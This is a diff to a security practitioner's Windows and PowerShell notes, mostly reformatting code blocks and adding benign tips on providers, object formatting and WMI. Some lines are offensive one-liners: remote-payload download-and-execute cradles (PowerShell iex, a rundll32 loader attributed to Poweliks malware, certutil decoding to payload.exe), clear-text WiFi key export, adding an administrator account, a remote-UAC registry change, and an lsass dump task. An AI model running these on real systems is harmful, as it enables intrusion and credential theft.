@@ -33,6 +33,13 @@ Basic PowerShell commands
       # List commands using "WMI" in their names
       gcm -noun *WMI*
 
+* Typing "Ctrl+Space" spawns PSReadLine module, which presents possible completion options (in a more powerful way than "Tab").
+
+* Basic PowerShell constructions include:
+
+  - ``ForEach-Object``, to perform an operation (between braces) on each item of an object (aliases: ``ForEach`` and ``%``)
+  - ``Where-Object``, to filter an object (aliases: ``Where`` and ``?``)
+
 PowerShell also provides commands to browse the filesystem.
 Here is a correspondence table between PowerShell commands and commands from other systems, that are also available in PowerShell as aliases:
 
@@ -83,29 +90,79 @@ Here is a correspondence table between PowerShell commands and commands from oth
 | ``Get-Help``            |         | ``help``          | ``man``            | Get the help associated with a cmdlet.       |
 +-------------------------+---------+-------------------+--------------------+----------------------------------------------+
 
+PowerShell provides objects in several hierarchies, that are "drives" provided by "providers":
+
+.. code-block:: sh
+
+    Get-PSProvider
+    Get-PSDrive
+
+    # Get the version of PowerShell
+    Get-Host
+    $PSVersionTable.PSVersion
+
+In order to use a drive, add a colon symbol to it:
+
+.. code-block:: sh
+
+    ls alias:
+    ls env:
+    ls variable:
+    ls env:path
+    ls function:h*
+    cat function:help
+
+    # In order to get $PATH:
+    (ls env:path).value
+    cat env:path
+    echo $env:path
+
+In order to use a provider, add two colons to it::
+
+    ls registry::HKEY_USERS
+
+Get the methods and properties:
+
+.. code-block:: sh
+
+    # For an object (instance of a class)
+    $obj | Get-Member
+    $obj | gm
+
+    # For a class (for the static methods and properties)
+    $obj | Get-Member -Static
+
 
 Download and run
 ----------------
 
 Download and run a script
 
-* PowerShell (``iex`` is an alias to ``Invoke-Expression``)::
+* PowerShell (``iex`` is an alias to ``Invoke-Expression``):
 
-    powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
+  .. code-block:: sh
 
-    powershell.exe -exec bypass "iex (New-Object Net.Webclient).DownloadString('http://webserver/payload.ps1')"
+      powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"
 
-* JavaScript through Rundll32 (used by Win32/Poweliks malware)::
+      powershell.exe -exec bypass "iex (New-Object Net.Webclient).DownloadString('http://webserver/payload.ps1')"
 
-    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+* JavaScript through Rundll32 (used by Win32/Poweliks malware):
 
-* Using ``certutil``::
+  .. code-block:: sh
 
-    certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
+
+* Using ``certutil``:
+
+  .. code-block:: sh
+
+      certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe
 
 Source: https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/amp/
 
-Downloading files with PowerShell::
+Downloading files with PowerShell:
+
+.. code-block:: sh
 
     $content = (New-Object Net.WebClient).DownloadString("http://webserver/file.txt")
 
@@ -115,7 +172,9 @@ Downloading files with PowerShell::
     # With BITS (Background Intelligent Transfer Service) (ipmo = Import-Module)
     ipmo BitsTransfer;Start-BitsTransfer -Source "http://webserver/file.txt" -Destination C:\Windows\Temp\
 
-Run a PowerShell script::
+Run a PowerShell script:
+
+.. code-block:: sh
 
     %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -Noninteractive -ExecutionPolicy Bypass –Noprofile -file MyScript.ps1
 
@@ -138,13 +197,17 @@ Run PowerShell code endoded as UTF-16LE+Base64:
 Proxy settings
 --------------
 
-Get the HTTP proxy which is currently configured::
+Get the HTTP proxy which is currently configured:
+
+.. code-block:: sh
 
     reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
     reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
     netsh winhttp dump
 
-Add a HTTP proxy::
+Add a HTTP proxy:
+
+.. code-block:: sh
 
     netsh winhttp set proxy 127.0.0.1:3128
 
@@ -152,11 +215,15 @@ Add a HTTP proxy::
 WiFi profiles
 -------------
 
-List available WiFi profiles::
+List available WiFi profiles:
+
+.. code-block:: sh
 
     netsh wlan show profiles
 
-Export WiFi profiles (username and password) to ``%APPDATA%\<profile>.xml``::
+Export WiFi profiles (username and password) to ``%APPDATA%\<profile>.xml``:
+
+.. code-block:: sh
 
     cmd.exe /c netsh wlan export profile key=clear folder="%APPDATA%"
 
@@ -231,35 +298,47 @@ Some commands to list and manage users and groups
     net user newuser password /add
     net localgroup Administrators newuser /add
 
-Spawn an elevated prompt when UAC is enabled (User Account Control)::
+Spawn an elevated prompt when UAC is enabled (User Account Control):
+
+.. code-block:: sh
 
     Start-Process -Verb RunAs PowerShell
     saps -verb runas powershell
 
 In order to login as administrator to a remote machine without using the built-in administrator (RID 500), a registry key needs to be set.
+
+.. code-block:: sh
+
+    cmd /c reg add
+      HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+      /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+    PowerShell Set-ItemProperty
+        –Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        –Name LocalAccountTokenFilterPolicy –Value 1 –Type DWord
+
 This has been described in many blog posts:
 
 * https://support.microsoft.com/en-us/help/942817/how-to-change-the-remote-uac-localaccounttokenfilterpolicy-registry-se
 * https://blogs.msdn.microsoft.com/wmi/2009/07/24/powershell-remoting-between-two-workgroup-machines/
 * https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
 
-::
-
-    cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
-    PowerShell Set-ItemProperty –Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System –Name LocalAccountTokenFilterPolicy –Value 1 –Type DWord
-
 
 Enumerate live objects
 ----------------------
 
-Enumerate all processes::
+Enumerate all processes:
+
+.. code-block:: sh
 
     tasklist /v
     query process *
     Get-Process
     # "gps" and "ps" are aliases of Get-Process
 
-Enumerate all services::
+Enumerate all services:
+
+.. code-block:: sh
 
     Get-Service | Export-CSV C:\Temp\AllServices.csv -NoTypeInfo
     gsv | epcsv C:\Temp\AllServices.csv -NoTypeInfo
@@ -268,12 +347,16 @@ Enumerate all services::
 Group Policy
 ------------
 
-Edit Local Group Policy::
+Edit Local Group Policy:
+
+.. code-block:: sh
 
     gpedit.msc
     secpol.msc
 
-Export the Local Group Policy::
+Export the Local Group Policy:
+
+.. code-block:: sh
 
     secedit /export /cfg system_config.cfg
 
@@ -318,7 +401,7 @@ A third way of running scripts on a system consists in using Immediate Scheduled
 Scheduled tasks
 ---------------
 
-In order to create a scheduled task that runs `ProcDump <https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>`_ on ``lsass.exe`` (Local Security Authority Subsystem service process) and uploads the result on a network share at 13:37, `schtasks <https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks>`_ can be used:
+In order to create a scheduled task that runs at 13:37 `ProcDump <https://docs.microsoft.com/en-us/sysinternals/downloads/procdump>`_ on ``lsass.exe`` (Local Security Authority Subsystem service process) and uploads the result onto a network share, `schtasks <https://docs.microsoft.com/en-us/windows/win32/taskschd/schtasks>`_ can be used:
 
 .. code-block:: sh
 
@@ -338,7 +421,9 @@ In order to create a scheduled task that runs `ProcDump <https://docs.microsoft.
 Software information
 --------------------
 
-In order to list the upgrades that have been applied, using DISM (Deployment Image Servicing and Management Tool)::
+In order to list the upgrades that have been applied, using DISM (Deployment Image Servicing and Management Tool):
+
+.. code-block:: sh
 
     dism /online /get-packages
 
@@ -376,7 +461,7 @@ The software may be signed using a certificate in a certificate store.
 Boot configuration
 ------------------
 
-::
+.. code-block:: sh
 
     msconfig
 
@@ -413,7 +498,7 @@ Firewall
 TCP port forwarding with netsh
 ------------------------------
 
-::
+.. code-block:: sh
 
     netsh interface portproxy add v4tov4 listenport=1234 listenaddress=192.0.2.42
         connectport=80 connectaddress=10.13.37.1
@@ -445,7 +530,9 @@ Network shares
     net use /user:me Z: \\my-server\my-share
     New-PSDrive –Name "Z" -PSProvider FileSystem –Root "\\my-server\my-share"
 
-In order to easily provide files to a Windows host from a Linux system, it is possible to use impacket to start a simple Samba server::
+In order to easily provide files to a Windows host from a Linux system, it is possible to use impacket to start a simple Samba server:
+
+.. code-block:: sh
 
     smbserver.py -smb2support -username me -password mypass my-share /path/to/my-share
 
@@ -465,7 +552,7 @@ Some scripts such as https://github.com/thom-s/netsec-ps-scripts/blob/master/pri
     $result.PingSucceeded
     $result.TcpTestSucceeded
 
-    # Open a netwotk socket to FTP port
+    # Open a network socket to FTP port
     $client = New-Object System.Net.Sockets.TcpClient(192.0.2.42, 21)
     $client.Close()
 
@@ -514,20 +601,28 @@ It is also possible to associate a path with a drive letter using command `subst
 Alternate Data Streams
 ----------------------
 
-Get files with ``Zone.Identifier`` alternate data stream (ADS)::
+Get files with ``Zone.Identifier`` alternate data stream (ADS):
+
+.. code-block:: sh
 
     Get-ChildItem -Recurse | Get-Item -Stream Zone.Identifier -ErrorAction SilentlyContinue |
         Select-Object FileName
 
-Read an ADS::
+Read an ADS:
+
+.. code-block:: sh
 
     Get-Content -Stream Zone.Identifier .\my-application.exe
 
-Remove an ADS::
+Remove an ADS:
+
+.. code-block:: sh
 
     Remove-Item .\my-application.exe -Stream Zone.Identifier
 
-When downloading a file from the Internet, ``dir`` shows a filename with suffix ``:Zone.Identifier:$DATA`` and with 26 bytes (each lines are ended by ``"\r\n"``::
+When downloading a file from the Internet, ``dir`` shows a filename with suffix ``:Zone.Identifier:$DATA`` and with 26 bytes (each lines are ended by ``"\r\n"``:
+
+.. code-block:: ini
 
     [ZoneTransfer]
     ZoneId=3
@@ -542,25 +637,79 @@ The empty ADS matches the usual content of a file. This means that the content i
 CSV and table viewer
 --------------------
 
-Display a simple CSV file in a simple GUI, from a PowerShell prompt::
+Display a simple CSV file in a simple GUI, from a PowerShell prompt:
+
+.. code-block:: sh
 
     Import-Csv -Path file.csv | Out-GridView
     ipcsv -Path file.csv | ogv
 
-In order to produce a CSV from a PowerShell command::
+In order to produce a CSV from a PowerShell command:
+
+.. code-block:: sh
 
     ... | Sort-Object -Property Timestamp | Export-Csv file.csv -notypeinformation
     ... | sort -Property Timestamp | epcsv file.csv -notypeinformation
 
-For a table in the CLI::
+For a table in the CLI:
+
+.. code-block:: sh
 
     ... | Format-Table
     ... | ft
 
-In order to show a table as a list::
+    # Show all properties of the object
+    ... | Format-Table -Property *
+    ... | ft *
+
+In order to show a table as a list:
+
+.. code-block:: sh
 
     ... | Format-List
     ... | fl
+
+    # Show all properties of the object
+    ... | Format-List -Property *
+    ... | fl *
+
+In order to filter the properties of an object, it is possible to use ``Select-Object`` with filters (eg. ``Select-Object a*, b*`` for properties that start with "a" or "b").
+
+``Select-Object`` can also be used to compute new properties.
+For example, in order to compute a size in Gigabytes, it is possible to use the unit suffix ``GB`` and the format string ``{0:N2}`` which formats floats using 2 digits after the dot:
+
+.. code-block:: sh
+
+    Get-WmiObject Win32_DiskDrive |
+      Select-Object Model,Status,@{Name='SizeGB';Expression={"{0:N2}" -f ($_.Size / 1GB)}}
+
+
+WMI
+---
+
+WMI (Windows Management Instrumentation) provides information about many parts of the operating system:
+
+.. code-block:: sh
+
+    # Enumerate WMI providers
+    Get-WmiObject -Class __Provider | ft
+
+    # Get information about the OS
+    gwmi Win32_OperatingSystem
+
+    # Launch a GUI to enumerate WMI classes for known namespaces (and PowerShell ScriptOMatic)
+    # In C:\Windows\System32\wbem\wbemtest.exe
+    wbemtest.exe
+
+In order to gather information about a Trusted Platform Module (TPM), the namespace needs to be changed:
+
+.. code-block:: sh
+
+    $tpm = Get-WmiObject -Namespace "root\CIMV2\Security\MicrosoftTpm" -Class Win32_Tpm
+    $tpm.IsEnabled()
+    $tpm.IsActivated()
+    $tpm.IsOwned()
+    $tpm.SelfTest()
 
 
 MSSQL client
